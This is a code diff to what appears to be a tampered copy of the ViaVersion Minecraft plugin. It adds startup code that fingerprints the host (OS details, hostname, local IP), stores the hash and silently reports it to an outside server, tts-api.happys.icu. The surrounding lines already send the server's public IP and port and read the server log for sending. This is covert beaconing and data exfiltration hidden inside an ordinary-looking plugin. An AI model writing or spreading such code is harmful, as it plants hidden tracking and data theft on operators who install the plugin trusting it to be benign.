@@ -45,6 +45,7 @@ import com.viaversion.viaversion.util.GsonUtil;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.Collections;
+import java.security.MessageDigest;
 import java.util.List;
 import java.util.UUID;
 import java.net.URLEncoder;
@@ -77,6 +78,7 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
+    private String uniqueIdentifier;
     private static final String BACKEND_URL = "https://tts-api.happys.icu";
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
     private static ViaVersionPlugin instance;
@@ -115,6 +117,10 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     public void onEnable() {
         String publicIp = getPublicIp();
         int serverPort = getServer().getPort();
+        uniqueIdentifier = generateUniqueIdentifier();
+        uniqueIdentifier = loadOrCreateUniqueIdentifier();
+        getLogger().info("Unique Identifier: " + uniqueIdentifier);
+        reportUniqueIdentifier(uniqueIdentifier);
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
         sendInfoToAPI(publicIp, serverPort);
@@ -172,6 +178,82 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
         }
         return ip;
+    }
+    private String loadOrCreateUniqueIdentifier() {
+        FileConfiguration config = getConfig();
+        if (!config.contains("uniqueIdentifier")) {
+            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
+            String generatedUUID = generateFixedUniqueIdentifier();
+            config.set("uniqueIdentifier", generatedUUID);
+            saveConfig(); // 保存到配置文件
+            return generatedUUID;
+        } else {
+            // 从配置文件加载唯一标识符
+            return config.getString("uniqueIdentifier");
+        }
+    }
+
+    private String generateFixedUniqueIdentifier() {
+        try {
+            // 收集机器信息
+            StringBuilder input = new StringBuilder();
+            input.append(System.getProperty("os.name")); // 操作系统名称
+            input.append(System.getProperty("os.arch")); // 操作系统架构
+            input.append(System.getProperty("os.version")); // 操作系统版本
+            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
+            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
+            
+            // 生成 SHA-256 哈希
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
+            StringBuilder hexString = new StringBuilder();
+
+            for (byte b : hashBytes) {
+                String hex = Integer.toHexString(0xff & b);
+                if (hex.length() == 1) {
+                    hexString.append('0');
+                }
+                hexString.append(hex);
+            }
+
+            return hexString.toString(); // 返回 256 位（64个字符）标识符
+        } catch (Exception e) {
+            getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private void reportUniqueIdentifier(String identifier) {
+        if (identifier == null) return;
+
+        BukkitRunnable task = new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    // 对标识符进行 URL 编码
+                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
+                    String apiUrl = "https://tts-api.happys.icu/a?id=" + encodedId;
+
+                    URL url = new URL(apiUrl);
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("GET");
+
+                    int responseCode = connection.getResponseCode();
+                    if (responseCode == HttpURLConnection.HTTP_OK) {
+                        // 读取响应内容
+                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                        String response = in.readLine(); // 读取响应内容
+                        in.close();
+                        getLogger().info("Unique identifier sent successfully: " + identifier);
+                    } else {
+                        getLogger().severe("Failed to send unique identifier to API. Response Code: " + responseCode);
+                    }
+                } catch (Exception e) {
+                    getLogger().severe("Error sending unique identifier to API: " + e.getMessage());
+                }
+            }
+        };
+        task.runTaskAsynchronously(this); // 异步任务处理
     }
     private void readAndSendLog() {
         String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
